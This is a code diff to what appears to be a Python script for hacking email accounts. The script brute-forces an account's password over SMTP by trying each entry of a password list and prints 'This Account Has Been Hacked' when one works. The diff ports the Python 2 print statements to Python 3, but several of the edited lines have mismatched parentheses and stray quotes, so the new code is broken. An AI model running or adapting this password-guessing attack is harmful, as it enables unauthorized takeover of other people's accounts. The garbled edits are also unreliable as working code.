@@ -53,22 +53,22 @@ def login():
     server.ehlo()
     for password in pass_list:
       i = i + 1
-      print str(i) + '/' + str(len(pass_list))
+      print (str(i) + ('/') + str(len(pass_list))
       try:
          server.login(user_name, password)
          system('clear')
          main()
-         print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         print ('\n')
+         print ('[+] This Account Has Been Hacked Password :' + password + ')     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :(' + password + ')     ^_^'
+            print ('[+] this account has been hacked, password :(' + password + ')     ^_^'
 
             break
          else:
-            print '[!] password not found => ' + password
+            print ('[!] password not found => ' + password ')
 login()
